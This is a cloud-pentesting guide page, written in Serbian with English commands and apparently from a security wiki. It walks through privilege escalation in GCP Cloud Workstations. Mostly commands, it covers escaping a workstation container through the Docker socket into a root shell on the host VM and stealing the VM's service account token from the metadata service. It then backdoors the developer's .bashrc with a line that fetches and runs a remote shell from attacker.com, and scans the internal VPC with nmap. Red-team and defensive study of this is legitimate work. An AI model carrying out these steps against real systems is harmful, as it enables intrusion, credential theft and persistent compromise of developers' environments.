# GCP - Cloud Workstations Privesc


### Container Breakout via Docker Socket (Container -> VM -> Project)

Primarni put za eskalaciju privilegija u Cloud Workstations proističe iz potrebe da se podrže **Docker-in-Docker (DinD)** workflows za developere. Kada konfiguracija workstation-a montira Docker socket ili dozvoljava privileged containers (uobičajena konfiguracija), napadač unutar workstation kontejnera može pobeći na podložni Compute Engine VM i ukrasti njegov service account token.

**Preduslovi:**
- Pristup Cloud Workstation terminalu (putem SSH, kompromitovane sesije, ili ukradenih kredencijala)
- Konfiguracija workstation-a mora montirati `/var/run/docker.sock` ili omogućiti privileged containers

**Arhitektonski kontekst:** Workstation je kontejner (Layer 3) koji se izvršava na Docker/Containerd runtime-u (Layer 2) na GCE VM-u (Layer 1). Docker socket daje direktan pristup host-ovom container runtime-u.

> [!NOTE]
> Alat [gcp-workstations-containerEscapeScript](https://github.com/AI-redteam/gcp-workstations-containerEscapeScript) automatizuje kompletan container escape i otvara vam root shell na host VM-u.

<details>

<summary>Korak 1: Proverite Docker socket</summary>
```bash
# Verify the Docker socket is available
ls -l /var/run/docker.sock
# Expected output: srw-rw---- 1 root docker 0 ...
```
</details>

<details>

<summary>Korak 2: Bekstvo u fajl sistem host VM-a</summary>

Pokrećemo privilegovani kontejner, montirajući korenski direktorijum hosta na `/mnt/host`. Takođe delimo mrežu hosta i PID namespace kako bismo maksimizirali vidljivost.
```bash
# Spawn a privileged container mounting the host's root filesystem
docker run -it --rm --privileged --net=host --pid=host \
-v /:/mnt/host \
alpine sh

# Inside the new container, chroot into the host
chroot /mnt/host /bin/bash
```
Sada imate **root shell na osnovnom Compute Engine VM** (Layer 1).

</details>

<details>

<summary>Korak 3: Steal the VM service account token from IMDS</summary>
```bash
# From the host VM, query the Instance Metadata Service
curl -s -H "Metadata-Flavor: Google" \
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Check which service account is attached
curl -s -H "Metadata-Flavor: Google" \
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email

# Check scopes (CRITICAL STEP)
curl -s -H "Metadata-Flavor: Google" \
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes
```
</details>

> [!CAUTION]
> **Proverite pristupne scope-ove!**
> Čak i ako je priloženi Service Account **Editor**, VM može biti ograničen pristupnim scope-ovima.
> Ako vidite `https://www.googleapis.com/auth/cloud-platform`, imate pun pristup.
> Ako vidite samo `logging.write` i `monitoring.write`, ograničeni ste na vektore **Network Pivot** i **Persistence** navedene dole.

<details>

<summary>Korak 4: Achieve Persistence (Backdoor the User)</summary>

Cloud Workstations montiraju persistent disk na `/home/user`. Pošto se container user (obično `user`, UID 1000) poklapa sa host user-om (UID 1000), možete pisati u home direktorijum hosta. Ovo vam omogućava da ubacite backdoor u okruženje čak i ako se workstation container ponovo izgradi.
```bash
# Check if you can write to the host's persistent home
ls -la /mnt/host/home/user/

# Drop a backdoor that executes next time the developer logs in
# Note: Do this from the container escape context
echo "curl http://attacker.com/shell | bash" >> /mnt/host/home/user/.bashrc
```
</details>

<details>

<summary>Step 5: Network Pivot (Internal VPC Access)</summary>

Pošto delite host network namespace (`--net=host`), sada ste pouzdan čvor u VPC-u. Možete skenirati interne servise koji dozvoljavaju pristup na osnovu IP whitelisting-a.
```bash
# Install scanning tools on the host (if internet access allows)
apk add nmap

# Scan the internal VPC subnet
nmap -sS -p 80,443,22 10.0.0.0/8
```
</details>
